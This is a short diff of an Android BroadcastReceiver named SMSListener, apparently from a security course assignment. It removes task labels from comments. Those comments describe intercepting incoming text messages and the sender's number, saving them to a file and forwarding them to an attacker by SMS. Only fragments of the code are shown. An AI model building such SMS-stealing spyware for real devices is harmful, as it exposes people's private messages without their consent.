@@ -53,7 +53,7 @@ public class SMSListener extends BroadcastReceiver
         try
         {
             /*
-             *  Task 3: Create a file and store the contents of the text message in the file,
+             *  Create a file and store the contents of the text message in the file,
              *  along with the sender's phone number. These contents will be sent back to the
              *  attacker in an SMS message.
              *
@@ -110,7 +110,7 @@ public class SMSListener extends BroadcastReceiver
                     sender = smsMessage.getDisplayOriginatingAddress(); // The phone number of the sender.
 
                     /*
-                     * Task 2: Create a Toast notification that shows the contents of the message,
+                     * Create a Toast notification that shows the contents of the message,
                      * along with the sender's phone number.
                      *
                      * Note: This part has been commented out, as per instructions in task 3.
@@ -124,7 +124,7 @@ public class SMSListener extends BroadcastReceiver
                     message = "Sender's Phone Number: " + sender + " Message: " + messageBody + " \n";
 
                     /*
-                     *  Task 3: Create a file and store the contents of the text message in the file,
+                     *  Create a file and store the contents of the text message in the file,
                      *  along with the sender's phone number. These contents will be sent back to the
                      *  attacker in an SMS message. (see above)
                      *
